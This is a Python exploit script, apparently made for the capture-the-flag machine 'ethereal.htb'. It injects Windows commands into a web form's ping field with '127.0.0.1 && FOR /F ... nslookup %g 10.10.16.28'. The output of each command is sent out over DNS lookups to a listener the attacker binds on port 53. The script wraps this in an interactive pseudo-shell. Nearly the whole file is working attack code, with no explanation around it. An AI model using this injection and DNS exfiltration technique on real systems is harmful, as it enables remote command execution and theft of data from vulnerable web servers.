#!/usr/bin/python3

from socket import *
from requests_futures.sessions import FuturesSession
import time
import select


s = socket(AF_INET, SOCK_DGRAM)
s.settimeout(10)
s.bind(('10.10.16.28', 53))

def recv():
    print("[+] Receiving data:")
    try:
        while True:
            data = s.recv(1024)
            if data[1] == 2: # A record
                print(data[13:-5])
    except Exception as e:
        print(e)
        print("[!] Done")
        return

def send(cmd, col):
    session = FuturesSession()
    session.post("http://ethereal.htb/p1ng/", data=
            {
                "__VIEWSTATE": "/wEPDwULLTE0OTYxODU3NjhkZD0G/ny1VOoO1IFda8cKvyAZexSk+Y22QbXBRP0gxbre",
                "__VIEWSTATEGENERATOR": "A7095145",
                "__EVENTVALIDATION": "/wEdAAOZvFNfMAAnpqKRCMR2SHn/4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN/siIFmy9ZoaWu7BT0ak0x7Uttp88efMu6vUQ1geHQSWQ==",
                "search": f"127.0.0.1 && FOR /F \"tokens={col}\" %g IN ('{cmd}') do (nslookup %g 10.10.16.28)",
                "ctl02": ""
            },
            proxies={"http": "127.0.0.1:8080"})

def shell():
    while 1:
        cmd = input("$> ")
        if cmd == "exit":
            s.close()
            exit()
        else:
            col = input("(col#)> ")
            if col == '':
                col = 1
            else:
                col = int(col)
            send(cmd, col)
            recv()

if __name__ == '__main__':
    shell()
